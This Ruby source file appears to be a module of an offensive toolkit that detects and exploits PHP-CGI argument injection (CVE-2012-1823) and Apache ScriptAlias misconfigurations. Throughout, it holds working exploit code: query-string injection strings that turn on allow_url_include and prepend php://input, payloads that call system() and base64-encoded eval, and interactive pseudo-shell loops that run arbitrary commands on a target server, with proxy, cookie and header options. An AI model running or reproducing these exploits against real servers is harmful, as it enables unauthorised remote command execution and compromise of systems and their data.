# PHP-CGI Related Bugs
# Checks & Exploits, whatevers clever...

# Try this injenction string used for Plesk 0day
# Helps with some more stricter PHP settings bypassing
# ?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input

# Checks for PHP-CGI RCE Exploit
# CVE-2012-1823 was assigned to this one
# Lots of exploits available for this if found
# Pass in Target (with or without full file)
# It will run check for vuln and report back findings
# Returns vuln URL link, or nil
def normal_php_cgi_rce_check(site)
  http=EasyCurb.new
  rnd = randz(8)
  chksum = Digest::MD5.hexdigest(rnd)
  test_payload = "<?php print(___); echo md5('#{rnd}'); print(___); ?>"
  trigger = '/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
  link = site + trigger
  res = http.post(link, test_payload)
  if res[0] =~ /___#{chksum}___/m
    print_good("PHP CGI Code Injection is Possible!")
    print_status("Confirmation: __#{chksum}__")
    print_status("POST: #{link}")
    print_status("DATA: #{test_payload}")
    return link
  end
  return nil
end

# Simply Execute Commands via PHP-CGI vuln
# Returns true on successful confirmation, false otherwise
def normal_php_cgi_rce_exploit_cmd(link, command)
  http=EasyCurb.new
  test_payload = "<?php print(___); system(#{command.strip.chomp}); print(___); ?>"
  if not link =~ /\?-d\+allow_url_include/i
    trigger = '?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
    site=link
    site.sub!(/\/$/, '') unless link.split('.')[-1] == 'php'
    link = site + trigger
  end
  res = http.post(link, test_payload)
  if res[0] =~ /___(.+)___|______/m
    return true
  else
    return false
  end
end

# PHP-CGI RCE Exploit
# CVE-2012-1823
def normal_php_cgi_rce_exploit_shell(link)
  puts
  prompt = "(Command)> "
  http=EasyCurb.new
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      puts
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      break
    else
      base = "print(___); system('#{cmd.strip.chomp}'); print(___);".b64e.gsub("\n", '')
      test_payload = "<?php eval(base64_decode('#{base}')); ?>"
      if not link =~ /\?-d\+allow_url_include/i
        trigger = '?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
        site=link
        site.sub!(/\/$/, '') unless link.split('.')[-1] == 'php'
        link = site + trigger
      end
      res = http.post(link, test_payload)
      if res[0] =~ /___(.+)___/m
        print_line("\n#{$1.strip.chomp}\n\n")
      else
        puts
        print_error("Problem finding results!")
        print_error("Check command and try again if expecting output....\n\n")
      end
    end
  end
end

# Apache ScriptAlias Misconfiguration => RCE
# EX: ScriptAlias /php/ /usr/bin/
# EX: ScriptAlias /local-bin /usr/bin
# Courtesy of Infodox's nice Blog writeup!
# http://insecurety.net/?p=912
# Pass in IP and it will run check for vuln
# Returns vuln URL link, or nil
# NOTE: Curb was being freakish and not cooperating...
# As result, i plugged in net/http to do things right
# Preserves most configuration options, but not tor or proxy auth....
def apache_script_alias_rce_check(site)
  if $config['HTTP']['TOR_PROXY']
    print_error("Sorry - NO TOR Support for this module at this time!")
    return nil
  end
  paths = [ '', '/backdoor', '/phppath', '/php_amon', '/local-bin', '/php', '/php3', '/php4', '/php5', '/bin', '/_php' ]
  paths.each do |p|
    rnd = randz(8)
    chksum = Digest::MD5.hexdigest(rnd)
    test_payload = "<?php print(___); echo md5('#{rnd}'); print(___); ?>"
    uri = URI.parse(site.sub(/\/$/, '') + p + URI.encode('/php?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-n'))
    if $config['HTTP']['PROXY']
      http = Net::HTTP.new(uri.host, uri.port, $config['HTTP']['PROXY_IP'], $config['HTTP']['PROXY_PORT'].to_i)
    else
      http = Net::HTTP.new(uri.host, uri.port)
    end
    request = Net::HTTP::Post.new(uri.request_uri, { "User-Agent" => $config['HTTP']['HTTP_USER_AGENT'] })
    request.body = test_payload
    if $config['HTTP']['REF']
      request['Referer'] = $config['HTTP']['REFERER']
    end
    if $config['HTTP']['HTTP_HEADERS_ADD']
      $config['HTTP']['HTTP_HEADERS'].each do |k, v|
        request["#{k}"] = "#{v}"
      end
    end
    if $config['HTTP']['COOKIESUPPORT']
      cookies = File.open($config['HTTP']['COOKIEFILE']).read
      request["Cookie"] = cookies.to_s
    end
    if $config['HTTP']['HTTP_AUTH']
      request.basic_auth $config['HTTP']['HTTP_AUTH_USER'], $config['HTTP']['HTTP_AUTH_PASS']
    end
    response = http.request(request)
    if response.body.gsub(/Notice: Use of undefined constant ___ - assumed '___' in - on line \d+/i, '') =~ /___#{chksum}/
      print_good("PHP CGI Code Injection is Possible!")
      print_status("Confirmation: __#{chksum}__")
      print_status("POST: #{uri}")
      print_status("DATA: #{test_payload}")
      return p
    else
      print_error("#{p}...")
    end
  end
  return nil
end

# PHP-CGI RCE Exploit due to Apache Misconfigurations
# Pass in prepped link from check & command to have run...
# Returns true on success or false otherwise
def apache_script_alias_rce_exploit_cmd(link, command)
  if $config['HTTP']['TOR_PROXY']
    print_error("Sorry - NO TOR Support for this module at this time!")
    return nil
  end
  test_payload = "<?php print(___); system(#{command.strip.chomp}); print(___); ?>"
  uri = URI.parse(link.sub(/\/$/, '') + URI.encode('/php?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-n'))
  if $config['HTTP']['PROXY']
    http = Net::HTTP.new(uri.host, uri.port, $config['HTTP']['PROXY_IP'], $config['HTTP']['PROXY_PORT'].to_i)
  else
    http = Net::HTTP.new(uri.host, uri.port)
  end
  request = Net::HTTP::Post.new(uri.request_uri, { "User-Agent" => $config['HTTP']['HTTP_USER_AGENT'] })
  request.body = test_payload
  if $config['HTTP']['REF']
    request['Referer'] = $config['HTTP']['REFERER']
  end
  if $config['HTTP']['HTTP_HEADERS_ADD']
    $config['HTTP']['HTTP_HEADERS'].each do |k, v|
      request["#{k}"] = "#{v}"
    end
  end
  if $config['HTTP']['COOKIESUPPORT']
    cookies = File.open($config['HTTP']['COOKIEFILE']).read
    request["Cookie"] = cookies.to_s
  end
  if $config['HTTP']['HTTP_AUTH']
    request.basic_auth $config['HTTP']['HTTP_AUTH_USER'], $config['HTTP']['HTTP_AUTH_PASS']
  end
  response = http.request(request)
  if response.body.gsub(/Notice: Use of undefined constant ___ - assumed '___' in - on line \d+/i, '') =~ /___(.+)___|______/m
    return true
  else
    return false
  end
end

# Apache scriptAlias RCE Pseudo Shell
def apache_script_alias_rce_exploit_shell(link)
  if $config['HTTP']['TOR_PROXY']
    print_error("Sorry - NO TOR Support for this module at this time!")
    return nil
  end
  puts
  prompt = "(Command)> "
  http=EasyCurb.new
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      puts
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to previous menu....")
      break
    else
      test_payload = "<?php print(___); system(#{cmd.strip.chomp}); print(___); ?>"
      uri = URI.parse(link.sub(/\/$/, '') + URI.encode('/php?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-n'))
      if $config['HTTP']['PROXY']
        http = Net::HTTP.new(uri.host, uri.port, $config['HTTP']['PROXY_IP'], $config['HTTP']['PROXY_PORT'].to_i)
      else
        http = Net::HTTP.new(uri.host, uri.port)
      end
      request = Net::HTTP::Post.new(uri.request_uri, { "User-Agent" => $config['HTTP']['HTTP_USER_AGENT'] })
      request.body = test_payload
      if $config['HTTP']['REF']
        request['Referer'] = $config['HTTP']['REFERER']
      end
      if $config['HTTP']['HTTP_HEADERS_ADD']
        $config['HTTP']['HTTP_HEADERS'].each do |k, v|
          request["#{k}"] = "#{v}"
        end
      end
      if $config['HTTP']['COOKIESUPPORT']
        cookies = File.open($config['HTTP']['COOKIEFILE']).read
        request["Cookie"] = cookies.to_s
      end
      if $config['HTTP']['HTTP_AUTH']
        request.basic_auth $config['HTTP']['HTTP_AUTH_USER'], $config['HTTP']['HTTP_AUTH_PASS']
      end
      response = http.request(request)
      if response.body.gsub(/Notice: Use of undefined constant ___ - assumed '___' in - on line \d+/i, '') =~ /___(.+)___/m
        print_line("\n#{$1.strip.chomp}\n\n")
      else
        puts
        print_error("Problem finding results!")
        print_error("Check command and try again if expecting output....\n\n")
      end
    end
  end
end
